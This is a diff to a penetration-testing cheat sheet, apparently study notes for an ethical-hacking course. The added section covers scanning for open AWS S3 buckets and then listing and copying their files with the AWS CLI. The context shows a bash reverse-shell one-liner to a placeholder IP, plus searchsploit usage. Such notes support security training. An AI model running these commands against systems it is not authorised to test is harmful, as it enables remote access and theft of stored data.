@@ -267,7 +267,23 @@ bash -i >& /dev/tcp/IP/9999 0>&1
  -   searchsploit -p 7618[.c] — Show complete path
  -   searchsploit — nmap file.xml — Search vulns inside a Nmap XML result
  
- # AWS
+ ### AWS
+ #### Scanning 
+ - pip3 install -r requirements.txt
+ - python3 ./s3scanner.py sites.txt and press Enter to run the tool.< br/>
+Here, sites.txt is a text file containing the target website URL that is scanned for open
+S3 buckets. You can edit the sites.txt file to enter the target website URL of your
+choice.
+ - python3 ./s3scanner.py --include-closed --out-file found.txt --dump names.txt
+ - python3 ./s3scanner.py names.txt
+ - python ./s3scanner.py --list names.txt
+ #### Exploiting
+ -pip3 install awscli
+ - https://console.aws.amazon.com
+ - aws configure
+ - Default region name field, type eu-west-1
+ - Let us list the directories in the certifiedhacker1 bucket. In the terminal window, type **aws s3 ls s3://[Bucket Name]**
+ -  aws s3 cp s3://bucket/folder/file.txt .
  -    List of S3 buckets: aws s3api list-buckets --query "Buckets[].Name"
 
   -  User Policies: aws iam list-user-policies
